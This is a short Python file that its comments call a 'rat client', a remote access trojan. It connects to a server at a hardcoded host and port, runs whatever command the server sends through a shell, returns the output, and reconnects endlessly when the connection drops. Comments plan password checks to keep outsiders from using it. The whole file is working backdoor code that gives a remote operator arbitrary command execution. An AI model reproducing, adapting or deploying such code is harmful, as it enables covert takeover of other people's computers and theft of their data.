import socket
import subprocess
import time
import os
host = '127.0.0.1'
port = 52918
password = '' #soon askfor password

#issue : security 
#-solution : add password with hashing base64/md5 to matching server password if timeout 3/5 second without password then DIE
#-solution : send header to matching the rat client not accessed from telnet

#function for run the remote task and send back to server
def action():
	cmd = server_conn.recv(1024)
	cmd = cmd.decode()
	proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdout_value = proc.stdout.read() + proc.stderr.read()
	if(stdout_value == b''):
		server_conn.send(b'Done.')
	else:
		server_conn.send(stdout_value)

#unlimited loop action
while(1):
	try:
		server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server_conn.connect((host, port))
		print("[*] Connected")
		#loop when get message from server then call function at function action
		while 1:
			try:
				msg = b''
				action()
			except socket.error:
				print("[-] Connection error...")
				break
		print("[-] Session Closed")
		server_conn.close()
		time.sleep(3)
		print("[*] Reconnecting to the server")

	except socket.error:
		print("[-] Can't reach the server...")
		time.sleep(3)

